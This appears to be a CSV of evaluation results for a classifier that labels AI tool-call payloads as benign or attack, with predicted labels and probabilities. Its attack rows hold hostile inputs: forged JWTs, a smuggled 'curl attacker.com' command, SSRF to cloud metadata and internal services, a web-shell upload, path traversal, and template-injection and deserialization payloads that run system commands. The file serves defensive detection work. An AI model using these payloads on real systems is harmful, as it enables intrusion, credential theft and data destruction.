tool_name,payload,true_label,pred_label,confidence,benign_prob,attack_prob,adapted
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.sig"", ""ke",attack,attack,0.43144840002059937,0.431448370218277,0.5685515999794006,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJhcGlfa2V5IjoieHh4In0.sig""}",attack,attack,0.4751436114311218,0.4751436114311218,0.5248563885688782,True
verify_jwt,"{""token"": ""eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.""}",attack,attack,0.6207149624824524,0.3792850077152252,0.6207149624824524,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJvY3QiLCJrIjoiY",attack,attack,0.44784730672836304,0.44784730672836304,0.552152693271637,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd",attack,attack,0.41935014724731445,0.41935011744499207,0.5806498527526855,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.secret""}",attack,attack,0.40766650438308716,0.40766647458076477,0.5923334956169128,True
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/18/""}",benign,attack,0.4130171537399292,0.5869828462600708,0.413017213344574,True
s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""key"": ""reports/report10.csv""}",benign,benign,0.6201833486557007,0.6201833486557007,0.3798166513442993,True
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/""}",benign,attack,0.44218093156814575,0.5578190684318542,0.44218096137046814,True
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/2/""}",benign,attack,0.4480213522911072,0.5519786477088928,0.44802141189575195,True
s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user24/file.txt""}",benign,attack,0.4660136103630066,0.5339863896369934,0.4660135805606842,True
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/14/""}",benign,attack,0.4128248691558838,0.5871751308441162,0.41282492876052856,True
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/8/""}",benign,attack,0.4326893091201782,0.5673106908798218,0.43268924951553345,True
s3_operation,"{""operation"": ""list"", ""bucket"": ""logs"", ""prefix"": ""2024/01/""}",benign,benign,0.6103246212005615,0.6103246212005615,0.3896753489971161,True
s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user12/file.txt""}",benign,attack,0.4764934778213501,0.5235065221786499,0.4764934778213501,True
s3_operation,"{""operation"": ""put"", ""bucket"": ""backups"", ""key"": ""2024/backup.sql""}",benign,attack,0.44820839166641235,0.5517916083335876,0.44820839166641235,True
s3_operation,"{""operation"": ""delete"", ""bucket"": ""temp"", ""key"": ""cache/old.json""}",benign,attack,0.4870085120201111,0.4870085120201111,0.5129914879798889,True
s3_operation,"{""operation"": ""get"", ""bucket"": ""documents"", ""key"": ""reports/annual.pdf""}",benign,benign,0.6617537140846252,0.6617537140846252,0.33824625611305237,True
s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user123/photo.jpg""}",benign,benign,0.6012760400772095,0.6012760400772095,0.39872390031814575,True
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""key"": ""cache/old.json"", ""prefix"": ""im",benign,attack,0.4553905725479126,0.5446094274520874,0.455390602350235,True
s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""prefix"": ""images/"", ""key"": ""user16/fi",benign,attack,0.46166253089904785,0.5383374691009521,0.46166253089904785,True
s3_operation,"{""operation"": ""get"", ""bucket"": ""my-app-data"", ""key"": ""uploads/file.pdf""}",benign,attack,0.44122588634490967,0.5587741136550903,0.44122588634490967,True
s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user0/file.txt""}",benign,attack,0.4725976586341858,0.5274023413658142,0.4725976586341858,True
s3_operation,"{""operation"": ""head"", ""bucket"": ""assets"", ""key"": ""logo.png""}",benign,attack,0.40509623289108276,0.5949037671089172,0.4050962030887604,True
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""key"": ""uploads/file.pdf"", ""prefix"": """,benign,benign,0.6163862943649292,0.6163862943649292,0.3836137652397156,True
s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-8"", ""key"": ""files/doc28.pdf""}",benign,attack,0.41717880964279175,0.5828211903572083,0.41717877984046936,True
s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-0"", ""key"": ""files/doc20.pdf""}",benign,attack,0.4359623193740845,0.5640376806259155,0.4359623193740845,True
s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""prefix"": ""images/"", ""key"": ""reports/rep",benign,attack,0.416363000869751,0.583636999130249,0.4163629710674286,True
s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-6"", ""key"": ""files/doc6.pdf""}",benign,attack,0.4166833758354187,0.5833166241645813,0.4166833758354187,True
s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""key"": ""reports/report22.csv""}",benign,benign,0.6114046573638916,0.6114046573638916,0.3885953724384308,True
s3_operation,"{""operation"": ""get"", ""bucket"": ""hr-data"", ""key"": ""employee-ssn.csv""}",attack,attack,0.4722558259963989,0.5277441740036011,0.47225579619407654,True
s3_operation,"{""operation"": ""get"", ""bucket"": ""company-secrets"", ""key"": ""credentials.json""}",attack,attack,0.48429757356643677,0.5157024264335632,0.48429757356643677,True
s3_operation,"{""operation"": ""list"", ""bucket"": ""audit-logs"", ""prefix"": """"}",attack,attack,0.4912259578704834,0.4912259578704834,0.5087740421295166,True
s3_operation,"{""operation"": ""list"", ""bucket"": ""`curl attacker.com`"", ""prefix"": """"}",attack,attack,0.6740850806236267,0.3259148895740509,0.6740850806236267,True
s3_operation,"{""operation"": ""get"", ""bucket"": ""http://169.254.169.254/latest/meta-data"", ""key"":",attack,attack,0.4135146737098694,0.5864853262901306,0.4135146737098694,True
s3_operation,"{""operation"": ""put"", ""bucket"": ""public-bucket"", ""key"": ""shell.php"", ""content"": """,attack,attack,0.6691200733184814,0.33087989687919617,0.6691200733184814,True
s3_operation,"{""operation"": ""copy"", ""source"": ""s3://victim-bucket/secrets"", ""dest"": ""s3://atta",attack,attack,0.4756889343261719,0.47568896412849426,0.5243110656738281,True
s3_operation,"{""operation"": ""get"", ""bucket"": ""../../../../etc"", ""key"": ""passwd""}",attack,attack,0.6884791851043701,0.3115207850933075,0.6884791851043701,True
send_webhook,"{""url"": ""https://api.pagerduty.com/webhooks"", ""payload"": {""event"": ""trigger""}}",benign,attack,0.4803156852722168,0.5196843147277832,0.4803156852722168,True
send_webhook,"{""url"": ""https://hooks.example.com/webhook/2"", ""payload"": {""event"": ""event_2""}}",benign,attack,0.49890339374542236,0.49890339374542236,0.5010966062545776,True
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 10""}}",benign,attack,0.489815890789032,0.510184109210968,0.489815890789032,True
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 0""}}",benign,attack,0.49513357877731323,0.49513357877731323,0.5048664212226868,True
send_webhook,"{""url"": ""https://webhook.site/32"", ""payload"": {""data"": 32}}",benign,attack,0.4317694306373596,0.5682305693626404,0.4317694902420044,True
send_webhook,"{""url"": ""https://hooks.example.com/webhook/6"", ""payload"": {""event"": ""event_6""}}",benign,attack,0.48387467861175537,0.5161253213882446,0.483874648809433,True
send_webhook,"{""url"": ""https://webhook.site/14"", ""payload"": {""data"": 14}}",benign,attack,0.4104798436164856,0.5895201563835144,0.4104797840118408,True
send_webhook,"{""url"": ""https://discord.com/api/webhooks/xxx/yyy"", ""payload"": {""content"": ""Mess",benign,attack,0.4883820414543152,0.5116179585456848,0.4883820712566376,True
send_webhook,"{""url"": ""https://webhook.site/8"", ""payload"": {""data"": 8}}",benign,attack,0.43039828538894653,0.5696017146110535,0.43039828538894653,True
send_webhook,"{""url"": ""https://api.zapier.com/hooks/catch/xxx"", ""payload"": {""data"": ""test""}}",benign,attack,0.4921213388442993,0.5078786611557007,0.4921213686466217,True
send_webhook,"{""url"": ""https://api.github.com/repos/owner/repo/dispatches"", ""payload"": {""event",benign,attack,0.4738340973854065,0.5261659026145935,0.4738340973854065,True
send_webhook,"{""url"": ""https://webhook.site/22"", ""payload"": {""data"": 22}}",benign,attack,0.41977256536483765,0.5802274346351624,0.41977259516716003,True
send_webhook,"{""url"": ""https://hooks.example.com/webhook/18"", ""payload"": {""event"": ""event_18""}",benign,attack,0.4770800471305847,0.5229199528694153,0.47707998752593994,True
send_webhook,"{""url"": ""https://hooks.example.com/webhook/12"", ""payload"": {""event"": ""event_12""}",benign,attack,0.479820191860199,0.520179808139801,0.47982022166252136,True
send_webhook,"{""url"": ""https://webhook.site/16"", ""payload"": {""data"": 16}}",benign,attack,0.42817890644073486,0.5718210935592651,0.42817890644073486,True
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 20""}}",benign,attack,0.4859660863876343,0.5140339136123657,0.48596611618995667,True
send_webhook,"{""url"": ""https://webhook.site/30"", ""payload"": {""data"": 30}}",benign,attack,0.4027221202850342,0.5972778797149658,0.40272215008735657,True
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 26""}}",benign,attack,0.4816650152206421,0.5183349847793579,0.4816649854183197,True
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 4""}}",benign,attack,0.4926221966743469,0.5073778033256531,0.4926222264766693,True
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 34""}}",benign,attack,0.48416656255722046,0.5158334374427795,0.48416659235954285,True
send_webhook,"{""url"": ""https://webhook.site/unique-id"", ""payload"": {""test"": true}}",benign,attack,0.4771661162376404,0.5228338837623596,0.47716614603996277,True
send_webhook,"{""url"": ""https://webhook.site/24"", ""payload"": {""data"": 24}}",benign,attack,0.4166901707649231,0.5833098292350769,0.4166901111602783,True
send_webhook,"{""url"": ""https://hooks.slack.com/services/xxx/yyy/zzz"", ""payload"": {""text"": ""Ale",benign,attack,0.495678186416626,0.4956781566143036,0.504321813583374,True
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 28""}}",benign,attack,0.48194122314453125,0.5180587768554688,0.48194122314453125,True
send_webhook,"{""url"": ""https://internal.corp.net/webhook"", ""payload"": {""token"": ""xxx""}}",attack,attack,0.496432363986969,0.496432363986969,0.503567636013031,True
send_webhook,"{""url"": ""http://localhost:6379/"", ""payload"": ""*1\r\n$8\r\nFLUSHALL\r\n""}",attack,attack,0.40455150604248047,0.40455153584480286,0.5954484939575195,True
send_webhook,"{""url"": ""gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>"", ""payload"": {}}",attack,attack,0.6108108758926392,0.3891891539096832,0.6108108758926392,True
send_webhook,"{""url"": ""http://127.0.0.1:9200/_search"", ""payload"": {""query"": {""match_all"": {}}}",attack,attack,0.486006498336792,0.48600655794143677,0.513993501663208,True
send_webhook,"{""url"": ""http://169.254.169.254/latest/meta-data/iam/security-credentials/"", ""pa",attack,attack,0.46852177381515503,0.531478226184845,0.46852174401283264,True
send_webhook,"{""url"": ""http://2852039166/latest/meta-data/"", ""payload"": {}}",attack,benign,0.6270484924316406,0.6270484924316406,0.3729515075683594,True
send_webhook,"{""url"": ""file:///etc/passwd"", ""payload"": {}}",attack,attack,0.6559831500053406,0.3440168797969818,0.6559831500053406,True
send_webhook,"{""url"": ""https://admin-api.company.com/notify"", ""payload"": {""secret"": ""yyy""}}",attack,attack,0.47262924909591675,0.47262924909591675,0.5273707509040833,True
render_template,"{""template"": ""Hello, {{name}}!"", ""data"": {""name"": ""John""}}",benign,attack,0.48121631145477295,0.48121628165245056,0.518783688545227,True
render_template,"{""template"": ""Hello, {{name}}! Your ID is 16"", ""data"": {""name"": ""User16""}}",benign,attack,0.49860846996307373,0.49860844016075134,0.5013915300369263,True
render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 14""}}",benign,attack,0.47794491052627563,0.5220550894737244,0.47794485092163086,True
render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 22""}}",benign,attack,0.48558610677719116,0.5144138932228088,0.48558610677719116,True
render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 30""}}",benign,attack,0.4826149344444275,0.5173850655555725,0.4826149046421051,True
render_template,"{""template"": ""User: {{user.name}} ({{user.email}})"", ""data"": {""user"": {""name"": """,benign,attack,0.49325937032699585,0.5067406296730042,0.49325934052467346,True
render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 18}}",benign,attack,0.4737430810928345,0.5262569189071655,0.4737430512905121,True
render_template,"{""template"": ""Hello, {{name}}! Your ID is 34"", ""data"": {""name"": ""User34""}}",benign,attack,0.4947294592857361,0.5052705407142639,0.4947294592857361,True
render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 10}}",benign,attack,0.4755932688713074,0.5244067311286926,0.4755932688713074,True
render_template,"{""template"": ""Hello, {{name}}! Your ID is 6"", ""data"": {""name"": ""User6""}}",benign,attack,0.4917222857475281,0.5082777142524719,0.4917222857475281,True
render_template,"{""template"": ""Hello, {{name}}! Your ID is 20"", ""data"": {""name"": ""User20""}}",benign,attack,0.49155980348587036,0.5084401965141296,0.49155983328819275,True
render_template,"{""template"": ""Hello, {{name}}! Your ID is 4"", ""data"": {""name"": ""User4""}}",benign,attack,0.49254751205444336,0.49254754185676575,0.5074524879455566,True
render_template,"{""template"": ""Order #{{order_id}} - Total: ${{total}}"", ""data"": {""order_id"": 123",benign,attack,0.4927782416343689,0.5072217583656311,0.4927782714366913,True
render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 12""}}",benign,attack,0.4827132225036621,0.5172867774963379,0.4827132523059845,True
render_template,"{""template"": ""Hello, {{name}}! Your ID is 24"", ""data"": {""name"": ""User24""}}",benign,attack,0.4894412159919739,0.5105587840080261,0.48944124579429626,True
render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 32""}}",benign,attack,0.493252694606781,0.506747305393219,0.4932526648044586,True
render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 2}}",benign,attack,0.4878461956977844,0.5121538043022156,0.4878461956977844,True
render_template,"{""template"": ""Items: {% for item in items %}{{item}}, {% endfor %}"", ""data"": {""i",benign,attack,0.4430466890335083,0.4430466890335083,0.5569533109664917,True
render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 8}}",benign,attack,0.47671449184417725,0.5232855081558228,0.47671449184417725,True
render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 0}}",benign,attack,0.4904763102531433,0.5095236897468567,0.4904763102531433,True
render_template,"{""template"": ""<h1>{{title}}</h1><p>{{content}}</p>"", ""data"": {""title"": ""Welcome""",benign,attack,0.49861305952072144,0.49861305952072144,0.5013869404792786,True
render_template,"{""template"": ""Date: {% now 'Y-m-d' %}"", ""data"": {}}",benign,attack,0.4064396023750305,0.4064396023750305,0.5935603976249695,True
render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 26""}}",benign,attack,0.4833880662918091,0.5166119337081909,0.48338809609413147,True
render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 28}}",benign,attack,0.4678741693496704,0.5321258306503296,0.467874139547348,True
render_template,"{""template"": ""{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",attack,attack,0.6761157512664795,0.3238842487335205,0.6761157512664795,True
render_template,"{""template"": ""API Key: {{api_key}}"", ""data"": {""api_key"": ""sk-xxx""}}",attack,attack,0.4854367971420288,0.4854368269443512,0.5145632028579712,True
render_template,"{""template"": ""Password: {{password}}"", ""data"": {""password"": ""secret""}}",attack,attack,0.4563167691230774,0.4563167691230774,0.5436832308769226,True
render_template,"{""template"": ""{{self._TemplateReference__context.cycler.__init__.__globals__.os.",attack,attack,0.6694865226745605,0.33051344752311707,0.6694865226745605,True
render_template,"{""template"": ""{{constructor.constructor('return this.process')().mainModule.requ",attack,attack,0.6895344257354736,0.310465544462204,0.6895344257354736,True
render_template,"{""template"": ""${{<%[%'\""}}%\\."", ""data"": {}}",attack,attack,0.6919688582420349,0.3080311119556427,0.6919688582420349,True
render_template,"{""template"": ""<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')",attack,attack,0.6923964023590088,0.3076035976409912,0.6923964023590088,True
render_template,"{""template"": ""${T(java.lang.Runtime).getRuntime().exec('id')}"", ""data"": {}}",attack,attack,0.6665242910385132,0.3334757685661316,0.6665242910385132,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 24, \""name\"": \""item24\""}""}",benign,attack,0.45444852113723755,0.45444849133491516,0.5455514788627625,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 18, \""name\"": \""item18\""}""}",benign,attack,0.44948703050613403,0.44948703050613403,0.550512969493866,True
deserialize_data,"{""format"": ""msgpack"", ""data"": ""base64_encoded_msgpack""}",benign,benign,0.6099201440811157,0.6099201440811157,0.3900798559188843,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 10, \""name\"": \""item10\""}""}",benign,attack,0.455990731716156,0.455990731716156,0.544009268283844,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 16}]}""}",benign,attack,0.6097949147224426,0.3902050852775574,0.6097949147224426,True
deserialize_data,"{""format"": ""xml"", ""data"": ""<data><item>test</item></data>""}",benign,attack,0.49846112728118896,0.4984610974788666,0.501538872718811,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""name\"": \""test\""}""}",benign,attack,0.41298818588256836,0.41298821568489075,0.5870118141174316,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 22, \""name\"": \""item22\""}""}",benign,attack,0.44567370414733887,0.44567370414733887,0.5543262958526611,True
deserialize_data,"{""format"": ""toml"", ""data"": ""[database]\nhost = \""localhost\""""}",benign,attack,0.43418049812316895,0.43418046832084656,0.565819501876831,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 6}]}""}",benign,attack,0.6107980012893677,0.3892019987106323,0.6107980012893677,True
deserialize_data,"{""format"": ""yaml"", ""data"": ""name: test\nvalue: 123""}",benign,attack,0.4634014368057251,0.5365985631942749,0.4634014666080475,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 26}]}""}",benign,attack,0.6081324219703674,0.3918675184249878,0.6081324219703674,True
deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 2\\nname: item2""}",benign,attack,0.4769037365913391,0.5230962634086609,0.4769037067890167,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 28}]}""}",benign,attack,0.6062144637107849,0.3937855362892151,0.6062144637107849,True
deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 30\\nname: item30""}",benign,attack,0.4401620626449585,0.5598379373550415,0.4401620924472809,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 1}]}""}",benign,attack,0.6195629835128784,0.3804369568824768,0.6195629835128784,True
deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 12\\nname: item12""}",benign,attack,0.4527818560600281,0.5472181439399719,0.4527818560600281,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 20, \""name\"": \""item20\""}""}",benign,attack,0.45225828886032104,0.45225828886032104,0.547741711139679,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 14, \""name\"": \""item14\""}""}",benign,attack,0.4641200304031372,0.464120090007782,0.5358799695968628,True
deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 32\\nname: item32""}",benign,attack,0.4891548156738281,0.5108451843261719,0.4891548156738281,True
deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 4\\nname: item4""}",benign,attack,0.47434812784194946,0.5256518721580505,0.47434815764427185,True
deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 8\\nname: item8""}",benign,attack,0.4727625250816345,0.5272374749183655,0.4727625250816345,True
deserialize_data,"{""format"": ""yaml"", ""data"": ""settings:\n  debug: false\n  port: 3000""}",benign,attack,0.4714707136154175,0.4714707136154175,0.5285292863845825,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 0}]}""}",benign,attack,0.6229913234710693,0.3770086467266083,0.6229913234710693,True
deserialize_data,"{""format"": ""json"", ""data"": ""{\""credentials\"": {\""key\"": \""secret\""}}""}",attack,attack,0.655028760433197,0.344971239566803,0.655028760433197,True
deserialize_data,"{""format"": ""php"", ""data"": ""O:8:\""stdClass\"":1:{s:4:\""evil\"";s:20:\""system('id');",attack,attack,0.6142879128456116,0.38571202754974365,0.6142879128456116,True
deserialize_data,"{""format"": ""yaml"", ""data"": ""!!python/object/new:subprocess.check_output [['cat',",attack,attack,0.6765963435173035,0.3234036862850189,0.6765963435173035,True
deserialize_data,"{""format"": ""yaml"", ""data"": ""api_key: sk-xxx""}",attack,attack,0.45899641513824463,0.5410035848617554,0.458996444940567,True
deserialize_data,"{""format"": ""java"", ""data"": ""rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==""}",attack,attack,0.6111897230148315,0.38881024718284607,0.6111897230148315,True
deserialize_data,"{""format"": ""yaml"", ""data"": ""!!python/object/apply:os.system ['id']""}",attack,attack,0.6572197079658508,0.3427802324295044,0.6572197079658508,True
deserialize_data,"{""format"": ""pickle"", ""data"": ""gASVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlF",attack,attack,0.44338369369506836,0.44338369369506836,0.5566163063049316,True
deserialize_data,"{""format"": ""ruby"", ""data"": ""!ruby/object:Gem::Requirement requirements: !ruby/ob",attack,attack,0.6768550872802734,0.32314494252204895,0.6768550872802734,True
